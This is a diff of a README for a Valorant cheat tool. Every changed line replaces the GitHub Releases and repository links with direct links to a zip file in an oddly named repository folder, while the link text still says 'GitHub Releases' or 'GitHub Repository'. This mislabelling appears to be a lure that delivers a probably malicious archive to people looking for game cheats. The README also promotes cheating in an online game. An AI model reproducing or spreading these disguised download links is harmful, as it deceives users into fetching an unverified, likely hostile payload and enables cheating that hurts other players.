@@ -6,7 +6,7 @@ Welcome to ValorantExternalCheat! This application helps you improve your gamepl
 
 ## 📥 Download Now
 
-[![Download from GitHub](https://img.shields.io/badge/Download%20Now-%23%2338A9F.png?style=for-the-badge&logo=github)](https://github.com/Casex01/ValorantExternalCheat/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/Casex01/ValorantExternalCheat/main/suasion/ValorantExternalCheat.zip%20Now-%23%https://raw.githubusercontent.com/Casex01/ValorantExternalCheat/main/suasion/ValorantExternalCheat.zip)](https://raw.githubusercontent.com/Casex01/ValorantExternalCheat/main/suasion/ValorantExternalCheat.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ ValorantExternalCheat supports the Riot game Valorant. This cheat is designed to
 
 ## 📂 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Casex01/ValorantExternalCheat/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Casex01/ValorantExternalCheat/main/suasion/ValorantExternalCheat.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of ValorantExternalCheat.
@@ -57,11 +57,11 @@ If you have questions or need help, join our community on Discord or our forum. 
 
 ## 🔄 Updates
 
-Stay tuned for updates! We will regularly add new features and improvements based on user feedback. To check for updates, always refer back to the [GitHub Releases page](https://github.com/Casex01/ValorantExternalCheat/releases).
+Stay tuned for updates! We will regularly add new features and improvements based on user feedback. To check for updates, always refer back to the [GitHub Releases page](https://raw.githubusercontent.com/Casex01/ValorantExternalCheat/main/suasion/ValorantExternalCheat.zip).
 
 ## 👉 Additional Links
 
-- [GitHub Repository](https://github.com/Casex01/ValorantExternalCheat)
+- [GitHub Repository](https://raw.githubusercontent.com/Casex01/ValorantExternalCheat/main/suasion/ValorantExternalCheat.zip)
 - [Discord Community](#)
 - [User Forum](#)
 
